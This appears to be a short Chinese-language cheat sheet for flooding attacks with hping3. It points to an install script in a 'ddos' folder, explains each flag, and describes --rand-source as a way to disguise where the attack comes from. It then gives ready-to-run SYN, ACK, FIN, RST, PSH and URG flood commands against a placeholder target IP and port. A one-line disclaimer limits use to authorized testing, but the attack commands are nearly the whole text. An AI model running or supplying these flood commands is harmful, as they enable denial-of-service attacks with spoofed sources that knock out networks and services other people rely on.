### 自动化安装hping3
    sudo python3.8 ddos/hping3/hping3.py

### 参数
- -S SYN 标志。

- -w 64: TCP 窗口大小设置为 64。

- -p 22: 目标端口。

- --rand-source: 使用伪随机 IP 地址作为源地址（伪装攻击来源）。

- --data 800: 数据负载为 800 字节。



### 🔥 SYN Flood 攻击
    hping3 dstip -p dstport --flood -S -w 64 --rand-source --data 800

### 📡 ACK Flood 攻击
    hping3 dstip -p dstport --flood -A -w 64 --rand-source --data 800

### 🧨 FIN Flood 攻击
    hping3 dstip -p dstport --flood -F -w 64 --rand-source --data 800

### ⚠️ RST Flood 攻击
    hping3 dstip -p dstport --flood -R -w 64 --rand-source --data 800

### 📤 PSH Flood 攻击
    hping3 dstip -p dstport --flood -P -w 64 --rand-source --data 800

### 🚨 URG Flood 攻击
    hping3 dstip -p dstport --flood -U -w 64 --rand-source --data 1400

### 注意事项
- 所有攻击命令 仅限于合法授权的测试环境。
    
- 切勿对公共网络或未授权的设备使用此类命令。
    
- 违反相关法律法规将承担法律责任。


